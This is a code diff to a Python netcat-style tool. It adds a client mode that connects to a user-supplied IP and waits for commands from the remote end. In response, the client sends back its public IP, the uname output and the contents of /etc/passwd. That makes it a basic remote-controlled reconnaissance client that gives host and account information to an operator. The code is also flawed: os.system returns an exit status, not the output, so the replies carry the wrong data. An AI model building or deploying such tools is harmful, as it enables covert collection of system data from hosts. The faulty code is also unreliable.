@@ -1,6 +1,8 @@
+import os
 from threading import Thread
 import socket
 import subprocess
+from requests import get
 
 
 class NetCat:
@@ -24,15 +26,25 @@ class NetCat:
         print("   [*]Socket has been initiated, looking for incoming connection...\n")
         sock_handler, IP = self.sock.accept()
 
-
     def ClientMode(self):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
         Ip = input("   [*]Enter ip to connect: ")
         self.sock.connect((Ip, self.PortNumber))
         print("   [*]Socket has been initialized and connected to end point host.")
+        IsStoped = True
 
+        while IsStoped:
+            buffer = self.sock.recv(4096).decode()
 
-
-
-
+            if buffer == "bye":
+                IsStoped = False
+            elif buffer == "get ip":
+                ip = get('https://api.ipify.org').content.decode('utf8')
+                self.sock.send(f'My public IP address is: {ip}'.encode())
+            elif buffer == "get os":
+                self.sock.send(f"{os.system('uname -a')}".encode())
+            elif buffer == "get all users" and os.name != 'nt':
+                self.sock.send(f"{os.system('cat /etc/passwd')}".encode())
+            elif buffer == "get all users plain":
+                self.sock.send(f"{os.system('cut -d: -f1 /etc/passwd')}".encode())
